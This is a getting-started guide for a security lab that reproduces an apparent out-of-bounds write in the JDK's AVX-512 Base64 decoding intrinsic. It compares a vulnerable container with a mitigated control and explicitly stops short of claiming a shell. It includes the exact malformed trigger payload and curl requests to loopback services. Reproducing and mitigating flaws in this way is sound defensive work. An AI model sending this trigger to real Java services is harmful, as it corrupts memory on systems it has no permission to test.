# Getting started

This guide explains which command to run, what the result means, and why the
public lab stops at a bounded out-of-bounds write rather than claiming a shell.

## Choose the path that matches your goal

| Goal | Command | What it establishes |
| --- | --- | --- |
| Check whether the host can run the lab | `make preflight` | Tools, Docker daemon, architecture, and CPU feature gate |
| Reproduce vulnerable versus mitigated behavior | `make verify` | HTTP reachability, 62-byte write, and a zero-write negative control |
| Check the Java installed on the host | `make check` | Local runtime, version assessment, CPU gate, and bounded decoder probe |
| Read the root cause | `docs/TECHNICAL.md` | Native tail calculation, store mask, and evidence levels |
| Understand the shell claim | `docs/RCE-STATUS.md` | What is public, what is private, and what would count as shell proof |
| Audit current public claims | `docs/PUBLIC-EXPLOIT-TRACKER.md` | Commit-pinned review of public repositories |

## What success looks like

A successful run has two results from the same pinned JDK image:

```text
vulnerable: changed_past_expected=62
mitigated:  changed_past_expected=0
```

This A/B comparison proves that the affected intrinsic changes bytes past the
expected Base64 output and that `-XX:-UseBASE64Intrinsics` blocks that behavior.
It does not prove that a general-purpose shell was obtained.

## Requirements

- an amd64 Linux host, or WSL2 with Docker Desktop integration;
- Docker Engine and the Compose plugin;
- Bash and `curl`;
- CPU flags `avx512f`, `avx512bw`, `avx512vbmi`, and `bmi2` visible inside the
  Linux environment.

Docker passes through CPU features. It does not emulate AVX-512 VBMI. A valid
container image can therefore return zero changed bytes on an ineligible host.

## Step 1: clone the repository

```bash
git clone https://github.com/zake1god/java2shell.git
cd java2shell
```

Run every command below from the repository root.

## Step 2: run the preflight check

```bash
make preflight
```

Expected output on a compatible host:

```text
arch=x86_64
cpu_gate=supported
docker_compose=available
docker_daemon=reachable
image_pin=FROM eclipse-temurin:25.0.5_8-jdk@sha256:...
preflight_status=ready
next_step=make verify
```

Preflight exit codes:

| Code | Meaning | Next action |
| ---: | --- | --- |
| `0` | Ready | Run `make verify` |
| `1` | Tool or Docker daemon missing | Install/start the named prerequisite |
| `2` | Architecture or CPU gate not met | Use an eligible amd64 host |
| `3` | CPU gate cannot be read | Run inside Linux/WSL2 and inspect `/proc/cpuinfo` |

## Step 3: run the complete Docker comparison

```bash
make verify
```

The wrapper performs four actions:

1. checks the prerequisites and CPU gate;
2. builds and starts both loopback-only services;
3. sends the same bounded malformed input to both services;
4. stops the services even if a later step fails.

The vulnerable service is mapped to `127.0.0.1:8080`. The mitigated service is
mapped to `127.0.0.1:8081`. Neither port is published on a non-loopback
interface by the supplied Compose file.

Expected result:

```text
[vulnerable container]
{"status":"reproduced","runtime":"25.0.5+8-LTS","input_length":65,"expected_output_size":50,"decoder_rejected":true,"changed_past_expected":62,"first_changed":50,"last_changed":111,"claim":"oob_write_only_not_shell"}
[mitigated control]
{"status":"not_reproduced","runtime":"25.0.5+8-LTS","input_length":65,"expected_output_size":50,"decoder_rejected":true,"changed_past_expected":0,"first_changed":-1,"last_changed":-1,"claim":"oob_write_only_not_shell"}
```

The wrapper ends with:

```text
verification_complete=true
evidence_level=bounded_oob_write_with_negative_control
shell_proven=false
```

`shell_proven=false` is an evidence label, not a failed test. The public lab is
designed to prove the native write and its mitigation without installing an
unrelated command endpoint.

## Step 4: understand every response field

| Field | Meaning |
| --- | --- |
| `status` | Whether bytes changed past the expected output size |
| `runtime` | Exact Java runtime inside the container |
| `input_length` | `65` for the JDK 25 public trigger used here |
| `expected_output_size` | Logical output length calculated for the malformed input |
| `decoder_rejected` | Java rejected the malformed Base64 after the native path ran |
| `changed_past_expected` | Count of sentinel bytes changed after the logical output |
| `first_changed` | First changed offset after the logical output, or `-1` |
| `last_changed` | Last changed offset, or `-1` |
| `claim` | Explicit evidence boundary for the result |

Both controls normally report `decoder_rejected=true`. The important
difference is whether memory after the expected output changed before that
exception was raised.

## Step 5: check a Java runtime without Docker

```bash
make check
```

The checker is local-only. It does not contact a remote host. It selects the
65-byte trigger for JDK 21, 25, and 27, and the 129-byte trigger for JDK 17.

Example vulnerable result:

```text
runtime=25.0.4+7-1-Debian
vendor=Debian
arch=amd64
cpu_gate=supported
version_assessment=known_affected_range
decoder_rejected=true
expected_output_size=50
changed_past_expected=62
first_changed=50
last_changed=111
result=VULNERABLE_BEHAVIOR_REPRODUCED
```

Checker exit codes:

| Code | Meaning |
| ---: | --- |
| `0` | The bounded write was not reproduced |
| `1` | Java was missing or the checker failed |
| `2` | Bytes past the expected output were changed |

Exit code `2` is the positive vulnerable-behavior result. It is intentionally
different from a generic success code so automation cannot silently ignore it.

## Verdict matrix

| Vulnerable side | Mitigated side | Interpretation |
| ---: | ---: | --- |
| `62` | `0` | Expected vulnerable behavior and clean negative control |
| `0` | `0` | Intrinsic did not reproduce; check CPU, architecture, runtime, and flags |
| `62` | `62` | Mitigation was not applied; inspect effective JVM flags |
| Any other value | Any value | Inconclusive; preserve output and open an issue with environment details |

Do not classify a remote service from an HTTP status alone. A `400`, `401`,
`500`, timeout, or connection reset cannot reveal the target CPU, JVM flag,
heap layout, or whether the Base64 intrinsic performed the write.

## Windows and WSL2

Use a WSL2 Linux terminal for the Bash scripts:

1. enable Docker Desktop WSL integration for the chosen distribution;
2. clone the repository inside the Linux filesystem when possible;
3. confirm `docker info` and `docker compose version` work inside WSL2;
4. run `make preflight` before building the image.

If `/proc/cpuinfo` does not expose all four flags, the lab cannot force the
missing instructions through Docker. Move the lab to a compatible host rather
than editing the gate.

## Manual HTTP comparison

For readers who want to see the exact request:

```bash
docker compose up --detach --build

payload="$(printf 'A%.0s' {1..64})="

curl --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8080/decode

curl --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8081/decode

docker compose down --remove-orphans
```

The endpoint accepts only the two public bounded trigger shapes. It has no
parameter that executes a command.

## Capturing reproducible evidence

Record the following when opening an issue or submitting a result:

```bash
git rev-parse HEAD
uname -a
grep -m1 '^flags' /proc/cpuinfo
docker version
docker compose version
docker compose images
make verify 2>&1 | tee java4shell-verification.txt
```

Review the transcript before sharing it. Do not include credentials, private
registry URLs, production hostnames, access tokens, or third-party data.

## If the result is different

Continue with [TROUBLESHOOTING.md](TROUBLESHOOTING.md). For root-cause details,
read [TECHNICAL.md](TECHNICAL.md). For the exact distinction between corruption
and command execution, read [RCE-STATUS.md](RCE-STATUS.md).
